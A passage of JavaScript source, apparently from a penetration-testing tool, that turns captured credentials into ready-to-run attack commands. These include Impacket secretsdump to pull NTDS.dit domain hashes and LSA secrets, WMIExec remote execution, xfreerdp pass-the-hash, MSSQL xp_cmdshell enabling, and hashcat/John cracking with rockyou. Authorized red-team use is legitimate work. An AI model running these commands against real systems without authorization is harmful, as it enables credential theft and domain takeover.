      });
      if (domain) {
        commands.push({
          id: 'impacket-secretsdump',
          label: 'Impacket SecretsDump (NTDS / LSA)',
          tool: 'impacket',
          badge: 'SECRETSDUMP',
          command: `impacket-secretsdump ${escapeShellArg(`${domain}/${user}@${ip}`)} -hashes :${secret}`,
          description: 'Extract NTDS.dit domain hashes and LSA secrets via DRSUAPI RPC.',
        });
      }
    }
  } else if (isPlaintext && (cred.service === 'smb' || cred.domain || cred.service === 'winrm')) {
    const domainPrefix = domain ? `${domain}/` : '';
    commands.push({
      id: 'impacket-wmiexec-pwd',
      label: 'Impacket WMIExec (Password)',
      tool: 'impacket',
      badge: 'WMIEXEC',
      command: `impacket-wmiexec ${escapeShellArg(`${domainPrefix}${user}:${secret}@${ip}`)}`,
      description: 'Semi-interactive command execution via WMI.',
    });
  }

  // 5. RDP (xfreerdp)
  if (cred.service === 'rdp' || cred.domain) {
    const dFlag = domain ? `/d:${domain} ` : '';
    const passArg = isNtlm ? `/pth:${secret}` : `/p:${safeSecret}`;
    commands.push({
      id: 'xfreerdp',
      label: 'xfreerdp Remote Desktop',
      tool: 'xfreerdp',
      badge: 'RDP',
      command: `xfreerdp /v:${ip} ${dFlag}/u:${user} ${passArg} +clipboard /dynamic-resolution`,
      description: 'Launch graphical remote desktop session with shared clipboard enabled.',
    });
  }

  // 6. MSSQL
  if (cred.service === 'mssql') {
    if (isPlaintext) {
      commands.push({
        id: 'nxc-mssql',
        label: 'NetExec MSSQL Enumeration',
        tool: 'netexec',
        badge: 'MSSQL',
        command: `netexec mssql ${ip} -u ${safeUser} -p ${safeSecret} ${domainFlag} -q 'SELECT @@version;'`,
        description: 'Execute query and test xp_cmdshell execution rights.',
      });
      commands.push({
        id: 'impacket-mssqlclient',
        label: 'Impacket mssqlclient Interactive Shell',
        tool: 'impacket',
        badge: 'MSSQLCLIENT',
        command: `impacket-mssqlclient ${escapeShellArg(`${domain ? `${domain}/` : ''}${user}:${secret}@${ip}`)}${domain ? ' -windows-auth' : ''}`,
        description: 'Interactive SQL query shell; use "enable_xp_cmdshell" then "xp_cmdshell whoami".',
      });
    }
  }

  // 7. Hashcat & John Cracking (HashForge Integration)
  if (isNtlm || cred.type === 'sha512' || cred.type === 'token') {
    const hashData = analyzeAndIdentifyHash(secret);
    const top = hashData.candidates[0];

    commands.push({
      id: 'hashcat-crack',
      label: `Hashcat Cracking (-m ${top.hashcatMode})`,
      tool: 'hashcat',
      badge: `HASHCAT:${top.hashcatMode}`,
      command: `hashcat -m ${top.hashcatMode} ${safeSecret} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O`,
      description: `Crack hash using Hashcat mode ${top.hashcatMode} (${top.name}) with rockyou dictionary and best64 rules.`,
    });

    commands.push({
      id: 'john-crack',
      label: `John the Ripper (--format=${top.johnFormat})`,
      tool: 'generic',
      badge: `JOHN:${top.johnFormat.toUpperCase()}`,
      command: `echo ${safeSecret} > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt --format=${top.johnFormat} hash.txt`,
      description: `Crack hash with John the Ripper using the ${top.johnFormat} format module.`,
    });
  }

  return commands;
}
